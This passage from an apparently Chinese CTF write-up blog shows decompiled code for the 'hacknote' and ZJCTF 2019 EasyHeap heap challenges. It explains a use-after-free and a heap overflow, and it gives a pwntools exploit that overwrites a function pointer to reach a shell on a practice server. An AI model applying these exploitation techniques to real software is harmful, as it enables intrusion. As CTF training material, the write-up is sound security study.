setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      del_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print_note();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>菜单题<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;       HackNote       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Add note          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. Delete note       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Print note        &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Exit              &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>各个选项函数如下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">int add_note()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v1; // esi</span><br><span class="line">  char buf[8]; // [esp+0h] [ebp-18h] BYREF</span><br><span class="line">  size_t size; // [esp+8h] [ebp-10h]</span><br><span class="line">  int i; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  result = count;</span><br><span class="line">  if ( count &gt; 5 )</span><br><span class="line">    return puts(&quot;Full&quot;);</span><br><span class="line">  for ( i = 0; i &lt;= 4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *((_DWORD *)&amp;notelist + i);</span><br><span class="line">    if ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_DWORD *)&amp;notelist + i) = malloc(8u);</span><br><span class="line">      if ( !*((_DWORD *)&amp;notelist + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Alloca Error&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">      &#125;</span><br><span class="line">      **((_DWORD **)&amp;notelist + i) = print_note_content;</span><br><span class="line">      printf(&quot;Note size :&quot;);</span><br><span class="line">      read(0, buf, 8u);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      v1 = *((_DWORD *)&amp;notelist + i);</span><br><span class="line">      *(_DWORD *)(v1 + 4) = malloc(size);</span><br><span class="line">      if ( !*(_DWORD *)(*((_DWORD *)&amp;notelist + i) + 4) )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Alloca Error&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">      &#125;</span><br><span class="line">      printf(&quot;Content :&quot;);</span><br><span class="line">      read(0, *(void **)(*((_DWORD *)&amp;notelist + i) + 4), size);</span><br><span class="line">      puts(&quot;Success !&quot;);</span><br><span class="line">      return ++count;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每个我们申请的chunk其实实现时申请了两个chunk，第一个数据区大小0x8储存print_note_content，一个函数，接下才是我们申请大小的chunk<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = *((_DWORD *)&amp;notelist + v2);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(*((_DWORD *)&amp;notelist + v2) + <span class="number">4</span>));</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;notelist + v2));</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free后指针没有置NULL<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">print_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = *((_DWORD *)&amp;notelist + v2);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> (**((<span class="type">int</span> (__cdecl ***)(_DWORD))&amp;notelist + v2))(*((_DWORD *)&amp;notelist + v2));</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后发现有后门函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int magic()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:08048945 magic           proc near</span><br><span class="line">.text:08048945</span><br><span class="line">.text:08048945 var_4           = dword ptr -4</span><br><span class="line">.text:08048945</span><br><span class="line">.text:08048945 ; __unwind &#123;</span><br><span class="line">.text:08048945                 push    ebp</span><br><span class="line">.text:08048946                 mov     ebp, esp</span><br><span class="line">.text:08048948                 push    ebx</span><br><span class="line">.text:08048949                 sub     esp, 4</span><br><span class="line">.text:0804894C                 call    __x86_get_pc_thunk_ax</span><br><span class="line">.text:08048951                 add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.text:08048956                 sub     esp, 0Ch</span><br><span class="line">.text:08048959                 lea     edx, (aBinSh - 804A000h)[eax] ; &quot;/bin/sh&quot;</span><br><span class="line">.text:0804895F                 push    edx             ; command</span><br><span class="line">.text:08048960                 mov     ebx, eax</span><br><span class="line">.text:08048962                 call    _system</span><br></pre></td></tr></table></figure><p>位于0x8048945处<br>checksec看一眼<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">turing@LAPTOP-6JKPOVPE:~$ checksec hacknote</span><br><span class="line">[*] <span class="string">&#x27;/home/turing/hacknote&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>很好，32位保护全关<br>delete_note函数存在uaf漏洞，我们先申请两个大小0x20（只要不等于0x8且在fastbin要求内即可，如果申请0x8的chunk，释放时会和存储print_note_content函数的chunk放在同一个fastbin中，后续便不好处理了）的chunk，chunk0和chunk1<br>再分别释放掉，这时其实释放了四个chunk，两两位于不同的fastbin中<br>只要我们再申请一个0x8大小的chunk，程序需要分配两个0x8的chunk，正好是chunk0和chunk1的函数chunk，然后我们写入magic函数的地址，便覆盖了chunk0的print_note_content函数，这时候再执行print chunk0时候就直接getshell了<br>exp如下<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29391</span>)</span><br><span class="line">shell_add=<span class="number">0x08048945</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">num</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">put</span>(<span class="params">num</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x8</span>,p64(shell_add))</span><br><span class="line">put(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x02-ZJCTF-2019-EasyHeap"><a href="#0x02-ZJCTF-2019-EasyHeap" class="headerlink" title="0x02 [ZJCTF 2019]EasyHeap"></a>0x02 [ZJCTF 2019]EasyHeap</h2><h3 id="复盘-fastbin-attack-got表覆写-heapoverflow"><a href="#复盘-fastbin-attack-got表覆写-heapoverflow" class="headerlink" title="复盘&#x2F;fastbin attack&#x2F;got表覆写&#x2F;heapoverflow"></a>复盘&#x2F;fastbin attack&#x2F;got表覆写&#x2F;heapoverflow</h3><p>题目源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4869</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">          l33t();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      create_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      edit_heap();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到有一个奇怪的函数l33t()，如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">l33t</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /home/pwn/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实在这题没有用，这个路径不存在，不用管了<br>菜单如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;       Easy Heap Creator       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Create a Heap               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. Edit a Heap                 &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Delete a Heap               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Exit                        &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>各个选项函数如下<br>creat_heap<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(&amp;heaparray + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      *(&amp;heaparray + i) = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;heaparray + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content of heap:&quot;</span>);</span><br><span class="line">      read_input(*(&amp;heaparray + i), size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;SuccessFul&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit_heap<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &gt;= <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    v2 = atoi(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input(*(&amp;heaparray + v1), v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在溢出<br>delete_heap<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 